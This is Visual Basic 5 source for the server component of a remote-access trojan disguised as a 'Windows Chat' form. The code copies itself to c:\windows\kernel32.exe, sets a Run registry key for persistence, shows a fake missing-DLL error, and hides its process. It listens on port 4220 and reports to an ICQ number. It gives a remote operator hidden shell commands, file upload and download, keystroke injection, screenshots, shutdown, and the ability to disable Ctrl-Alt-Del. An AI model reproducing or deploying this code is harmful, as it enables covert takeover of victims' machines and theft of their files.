VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Windows Chat"
   ClientHeight    =   1710
   ClientLeft      =   45
   ClientTop       =   300
   ClientWidth     =   3840
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "MainForm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   1710
   ScaleWidth      =   3840
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   1800
      Top             =   1200
   End
   Begin VB.Timer Timer1 
      Interval        =   250
      Left            =   2280
      Top             =   1200
   End
   Begin MSWinsockLib.Winsock server 
      Left            =   3240
      Top             =   1920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   4220
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Send"
      Default         =   -1  'True
      Height          =   285
      Left            =   2880
      TabIndex        =   1
      Top             =   1320
      Width           =   855
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Height          =   285
      Left            =   120
      MaxLength       =   90
      TabIndex        =   0
      Text            =   "enter chat text here"
      Top             =   1320
      Width           =   2655
   End
   Begin VB.ListBox List1 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      Height          =   1080
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   3615
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H00400000&
      Caption         =   "not connected"
      ForeColor       =   &H00E0E0E0&
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1800
      Width           =   3615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ServerVersion As String
Dim VictimDetails As String
Dim BinSendFileName As String
Dim BinData As String
Dim BinSoFar As Long
Dim IncBinLen As Long
Dim BinFileName As String
Dim IncBinary As Boolean
Dim UploadPath As String
Dim ConnectStatus As Boolean



Private Sub Command1_Click()
If Text1 = "" Then Exit Sub
List1.AddItem "" & Text1
Send "chat:" & Text1
Text1 = ""
List1.TopIndex = List1.ListCount - 1

End Sub

Private Sub Form_Load()
'********'********'********'********'********'********'********'********
'IMPORTANT!!!!!!!! TO ACTIVATE ICQ NOTIFICATION YOU MUST WRITE
'YOUR ICQ NUMBER BELOW AT THE BOOKMARKED POINT
'********'********'********'********'********'********'********'********


Dim TempString1 As String

If Not App.EXEName = "KERNEL32" Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "c:\windows\kernel32.exe"
TempString1 = ReadKey("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32")
If Not TempString1 = "kernel32.exe" Then CreateKey "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32", "kernel32.exe"
MsgBox "A required .dll file is missing", vbCritical, "Error"
VBA.Shell "kernel32.exe"
End
Exit Sub
End If

    Dim lngProcessID As Long
    Dim lngReturn As Long
    
    lngProcessID = GetCurrentProcessId()
    lngReturn = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)


TempString1 = ReadKey("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32")
If Not TempString1 = "kernel32.exe" Then CreateKey "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32", "kernel32.exe"

If IsConnected = True Then ConnectStatus = True
If IsConnected = False Then ConnectStatus = False

If Internet.IsConnected = True Then

Dim MyIcqNumber As Long
MyIcqNumber = 0 'PUT YOUR ICQNUMBER HERE *****************
FormMain.TextUIN = MyIcqNumber
FormMain.TextSubject = "gh_pro"
FormMain.TextMessage = Time$
If Not MyIcqNumber = 0 Then FormMain.BtnSend_Click
End If

ServerVersion = "1.4 Millenium"
server.Close
server.LocalPort = 4220
server.Listen
UploadPath = "c:\"

End Sub

Private Sub server_Close()
Label1 = "not connected"
Form1.Hide
IncBinary = False

server.Close
server.Listen
End Sub

Private Sub server_ConnectionRequest(ByVal requestID As Long)

server.Close
server.Accept requestID
Do
If server.State = 7 Then GoTo 10
If server.State = 9 Then GoTo 20
DoEvents
Loop

Exit Sub
10 Label1 = "connection established"


Exit Sub
20 Label1 = "error occured"
server.Close
server.Listen


End Sub
Public Sub SendBinary(FileName As String)
On Error GoTo 10
BinSendFileName = FileName
If FileLen(FileName) = 0 Then
Send "File is 0 bytes, cannot download."
Exit Sub
End If

Send "binary:" & FileLen(FileName)
Exit Sub
10 Send "Error: " & Err.Description


End Sub
Private Sub server_DataArrival(ByVal bytesTotal As Long)
Dim incData As String

If IncBinary = True Then
server.GetData BinData1$, vbByte

BinData = BinData & BinData1$
BinSoFar = BinSoFar + bytesTotal

If BinSoFar = IncBinLen Then

Open UploadPath & BinFileName For Binary As #1
Put #1, , BinData
Close #1
IncBinary = False
Send "Upload complete of " & BinFileName
End If
Exit Sub
End If



server.GetData incData

Label1 = incData

If Mid(incData, 1, 5) = "chat:" Then

If Form1.Visible = False Then Form1.Text1 = "enter chat text here": Text1.SelStart = 0: Text1.SelLength = Len(Text1)

Form1.Show
Form1.Text1.SetFocus

List1.AddItem " - " & Mid(incData, 6)
List1.TopIndex = List1.ListCount - 1
Send "Chat text arrived at remote pc"
StayOnTop Form1
Exit Sub
End If

If incData = "binaryready" Then
Send "binsendfilename:" & BinSendFileName
Exit Sub
End If

If incData = "binaryready2" Then
Dim BinData2 As String
Open BinSendFileName For Binary As #1
BinData2 = String(FileLen(BinSendFileName), " ")
Get #1, , BinData2
Close #1
If BinSendFileName = "ghTempIm01.tmp" Then Kill BinSendFileName
If BinSendFileName = "ghTempIm02.tmp" Then Kill BinSendFileName
server.SendData BinData2

Exit Sub
End If


If Mid(incData, 1, 16) = "binsendfilename:" Then
Dim TempInt01 As Integer

BinFileName = StrReverse(Mid(incData, 17))
TempInt01 = InStr(1, BinFileName, "\") - 1
BinFileName = Mid(BinFileName, 1, TempInt01)
BinFileName = StrReverse(BinFileName)
IncBinary = True
Send "binaryready2"


Exit Sub
End If


If Mid(incData, 1, 11) = "uploadpath:" Then
UploadPath = Mid(incData, 12)
Send "Remote upload path changed"
Exit Sub
End If

If Mid(incData, 1, 9) = "download:" Then
SendBinary Mid(incData, 10)
Exit Sub
End If


If Mid(incData, 1, 7) = "binary:" Then
Dim Temp01 As Integer
Dim Temp02 As Integer
'IncBinary = True

IncBinLen = Mid(incData, 8)
BinData = ""
BinSoFar = 0
Send "binaryready"

Exit Sub
End If

If incData = "removeserver" Then
Send "Removing server.."
Registry.DeleteKey "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32"
Send "Server closing.."
server.Close
End
Exit Sub
End If



If incData = "closeserver" Then
Send "Server closing.."
server.Close
End
Exit Sub
End If


If incData = "closechat" Then
Form1.Hide
List1.Clear
Text1 = "enter chat text"
Send "Chat window closed"
Exit Sub
End If

If incData = "hideclock" Then
HideTaskBarClock
Send "Clock hidden"
Exit Sub
End If

If incData = "showclock" Then
ShowTaskBarClock
Send "Clock shown"
Exit Sub
End If

If incData = "hidetaskbar" Then
HideTaskBar
Send "Taskbar hidden"
Exit Sub
End If

If incData = "showtaskbar" Then
ShowTaskBar
Send "Taskbar shown"
Exit Sub
End If


If incData = "shutdownpc" Then
WINShutdown
Send "Shutting down.."
Exit Sub
End If

If incData = "restartpc" Then
WINReboot
Send "Restarting.."
Exit Sub
End If

If incData = "hidedesktop" Then
HideDesktop
Send "Desktop hidden"
Exit Sub
End If

If incData = "showdesktop" Then
ShowDesktop
Send "Desktop shown"
Exit Sub
End If

If incData = "winshot" Then
SShot "c:\windows\temp\ghTempIm01", 2
Exit Sub
End If

If incData = "screenshot" Then
SShot "c:\windows\temp\ghTempIm02", 1
Exit Sub
End If

If incData = "opencd" Then
Send "Opening CD-ROM Drive.."
Sleep 10
Multimedia.OpenCD
Send "CD-ROM Drive opened."
Exit Sub
End If

If incData = "closecd" Then
Send "Closing CD-ROM Drive.."
Sleep 10
Multimedia.CloseCD
Send "CD-ROM Drive closed."
Exit Sub
End If

If incData = "showsystray" Then
ShowTaskBarIcons
Send "Taskbar icons shown"
Exit Sub
End If

If incData = "hidesystray" Then
HideTaskBarIcons
Send "Taskbar icons hidden"
Exit Sub
End If


If Mid(incData, 1, 11) = "doscommand:" Then
VBA.Shell "command.com /c " & Mid(incData, 12), vbHide + vbMinimizedNoFocus
Send "Command sent to prompt"
Exit Sub
End If

If Mid(incData, 1, 6) = "shell:" Then
ShellFile Mid(incData, 7)
Exit Sub
End If


If incData = "serverversion" Then
Send "Server version: " & ServerVersion
Exit Sub
End If

If Mid(incData, 1, 9) = "sendkeys:" Then
SendKeys Mid(incData, 10)
Send "Keys sent (" & Mid(incData, 10) & ")"
Exit Sub
End If


If Mid(incData, 1, 7) = "msgbox:" Then
DisplayMessageBox (incData)
Exit Sub
End If



Send "Server does not support command (" & incData & ")"


End Sub

Private Sub server_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Label1 = "not connected"
IncBinary = False

Form1.Hide
server.Close
server.Listen
End Sub

Private Sub Text1_GotFocus()
Text1.SelStart = 0: Text1.SelLength = Len(Text1)
End Sub

Public Sub Send(text As String)
If server.State = 7 Then
server.SendData text
Sleep 100
End If

End Sub









'VARIOUS FUNCTIONS


Public Function CenterForm(TENProg As Form)
TENProg.Top = (Screen.Height * 0.95) / 2 - TENProg.Height / 2
TENProg.Left = Screen.Width / 2 - TENProg.Width / 2
End Function

Public Function StayOnTop(TheForm As Form)
Dim SetWinOnTop As Long
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Function

Public Function NotOnTop(frm As Form)
Dim SetWinOnTop As Long
SetWinOnTop = SetWindowPos(frm.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Function

Public Function Pause(HesitateTime)
Dim Hesitator As Long

Hesitator& = Timer
Do While Timer - Hesitator& < Val(HesitateTime)
    DoEvents
Loop
End Function

Public Function HideTaskBar()
Dim Handle As Long
Handle& = FindWindow("Shell_TrayWnd", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowTaskBar()
Dim Handle As Long
Handle& = FindWindow("Shell_TrayWnd", vbNullString)
ShowWindow Handle&, 1
End Function

Public Function ShowDesktop()
'To Show Desktop
Dim hwnd As Long
hwnd = FindWindowEx(0&, 0&, "Progman", vbNullString)
ShowWindow hwnd, 5

End Function

Public Function HideDesktop()
'To Hide Desktop
Dim hwnd As Long
hwnd = FindWindowEx(0&, 0&, "Progman", vbNullString)
ShowWindow hwnd, 0
End Function
Public Function HideStartButton()
Dim Handle As Long, FindClass As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
Handle& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowStartButton()
Dim Handle As Long, FindClass As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
Handle& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
ShowWindow Handle&, 1
End Function


Public Function HideTaskBarClock()
Dim FindClass As Long, FindParent As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", vbNullString)
FindParent& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
Handle& = FindWindowEx(FindParent&, 0, "TrayClockWClass", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowTaskBarClock()
Dim FindClass As Long, FindParent As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", vbNullString)
FindParent& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
Handle& = FindWindowEx(FindParent&, 0, "TrayClockWClass", vbNullString)
ShowWindow Handle&, 1
End Function


Public Function HideTaskBarIcons()
Dim FindClass As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
Handle& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowTaskBarIcons()
Dim FindClass As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
Handle& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
ShowWindow Handle&, 1
End Function


Public Function HideProgramsShowingInTaskBar()
Dim FindClass As Long, FindClass2 As Long, Parent As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
FindClass2& = FindWindowEx(FindClass&, 0, "ReBarWindow32", vbNullString)
Parent& = FindWindowEx(FindClass2&, 0, "MSTaskSwWClass", vbNullString)
Handle& = FindWindowEx(Parent&, 0, "SysTabControl32", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowProgramsShowingInTaskBar()
Dim FindClass As Long, FindClass2 As Long, Parent As Long, Handle As Long
FindClass& = FindWindow("Shell_TrayWnd", "")
FindClass2& = FindWindowEx(FindClass&, 0, "ReBarWindow32", vbNullString)
Parent& = FindWindowEx(FindClass2&, 0, "MSTaskSwWClass", vbNullString)
Handle& = FindWindowEx(Parent&, 0, "SysTabControl32", vbNullString)
ShowWindow Handle&, 1
End Function


Function HideWindowsToolBar()
Dim FindClass1 As Long, FindClass2 As Long, Parent As Long, Handle As Long
FindClass1& = FindWindow("BaseBar", vbNullString)
FindClass2& = FindWindowEx(FindClass1&, 0, "ReBarWindow32", vbNullString)
Parent& = FindWindowEx(FindClass2&, 0, "SysPager", vbNullString)
Handle& = FindWindowEx(Parent&, 0, "ToolbarWindow32", vbNullString)
ShowWindow Handle&, 0
End Function

Public Function ShowWindowsToolBar()
Dim FindClass1 As Long, FindClass2 As Long, Parent As Long, Handle As Long
FindClass1& = FindWindow("BaseBar", vbNullString)
FindClass2& = FindWindowEx(FindClass1&, 0, "ReBarWindow32", vbNullString)
Parent& = FindWindowEx(FindClass2&, 0, "SysPager", vbNullString)
Handle& = FindWindowEx(Parent&, 0, "ToolbarWindow32", vbNullString)
ShowWindow Handle&, 1
End Function


Public Function ScreenBlackOut(TheForm As Form)
StayOnTop TheForm
HideTaskBar
HideWindowsToolBar
'TheForm.BorderStyle = 0
TheForm.Caption = ""
Screen.MousePointer = vbHourglass
TheForm.BackColor = &H0&
'TheForm.BorderStyle = 0
TheForm.Height = Screen.Height
TheForm.Width = Screen.Width
TheForm.Left = Screen.Width - Screen.Width
TheForm.Top = Screen.Height - Screen.Height
PreventFromClosing
DisableCtrlAltDel
End Function

Public Function ScreenUnBlackOut(TheForm As Form)
NotOnTop TheForm
ShowTaskBar
ShowWindowsToolBar
'TheForm.BorderStyle = 3
TheForm.Caption = "Form"
Screen.MousePointer = vbArrow
TheForm.BackColor = &H8000000A
TheForm.Width = Screen.Width / 2
TheForm.Height = Screen.Height / 2
TheForm.Left = Screen.Width / 2 - TheForm.Width / 2
TheForm.Top = Screen.Height / 2 - TheForm.Height / 2
UnPreventFromClosing
EnableCtrlAltDel
End Function

Public Function PreventFromClosing()
Dim process As Long
process = GetCurrentProcessId()
RegisterServiceProcess process, RSP_SIMPLE_SERVICE
End Function

Public Function UnPreventFromClosing()
Dim process As Long
process = GetCurrentProcessId()
RegisterServiceProcess process, RSP_UNREGISTER_SERVICE
End Function

Public Function DisableCtrlAltDel()
Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Function

Public Function EnableCtrlAltDel()
Dim ret As Integer
Dim pOld As Boolean
ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Function

Public Function WINShutdown()
ExitWindowsEx EWX_SHUTDOWN, 1
ExitWindowsEx EWX_SHUTDOWN, 1
ExitWindowsEx EWX_SHUTDOWN, 1
End Function

Public Function WINReboot()
ExitWindowsEx EWX_REBOOT, 0
ExitWindowsEx EWX_REBOOT, 0
ExitWindowsEx EWX_REBOOT, 0
End Function


Private Sub DisplayMessageBox(msgB As String)

'End Sub
On Error GoTo 66
Dim msgbTitle As String
Dim msgbText As String
Dim msgbType As String
Dim X As Integer
X = 0
'GET TITLE
Do
X = X + 1
msgbTitle = Mid(msgB, 8, X)
If Right(msgbTitle, 1) = ":" Then
msgbTitle = Mid(msgB, 8, X - 1)
GoTo 10
End If
Loop
10 msgB = Mid(msgB, 8 + X)

'GET TYPE
If Mid(msgB, 1, 1) = "1" Then msgbType = "1"
If Mid(msgB, 1, 1) = "2" Then msgbType = "2"
If Mid(msgB, 1, 1) = "3" Then msgbType = "3"
If Mid(msgB, 1, 1) = "4" Then msgbType = "4"
msgB = Mid(msgB, 3)


'GET TEXT
msgbText = msgB


If msgbType = "2" Then
MsgBox msgbText, vbInformation + vbMsgBoxSetForeground, msgbTitle
Send "response:ok"
End If

If msgbType = "3" Then
MsgBox msgbText, vbExclamation + vbMsgBoxSetForeground, msgbTitle
Send "response:ok"
End If

If msgbType = "4" Then
MsgBox msgbText, vbCritical + vbMsgBoxSetForeground, msgbTitle
Send "response:ok"
End If


'VB YESNO BOX
If msgbType = "1" Then
Dim MyString
Response = MsgBox(msgbText, vbQuestion + vbYesNo + vbMsgBoxSetForeground, msgbTitle)
If Response = vbYes Then
Send "response:yes"
End If
If Response = vbNo Then
Send "response:no"
End If
End If



Exit Sub
66
Send "error: messagebox"
End Sub

Private Sub Timer1_Timer()
If IsConnected = True And ConnectStatus = False Then
Timer2.Enabled = True
ConnectStatus = True
Exit Sub
End If


If IsConnected = False And ConnectStatus = True Then
ConnectStatus = False
Exit Sub
End If


End Sub

Private Sub Timer2_Timer()
If Internet.IsConnected = True Then
Dim MyIcqNumber As Long
MyIcqNumber = 51840142 'PUT YOUR ICQNUMBER HERE *****************
FormMain.TextUIN = MyIcqNumber
FormMain.TextSubject = "gh_pro"
FormMain.TextMessage = Time$
FormMain.BtnSend_Click
Timer2.Enabled = False
ConnectStatus = True
End If
End Sub
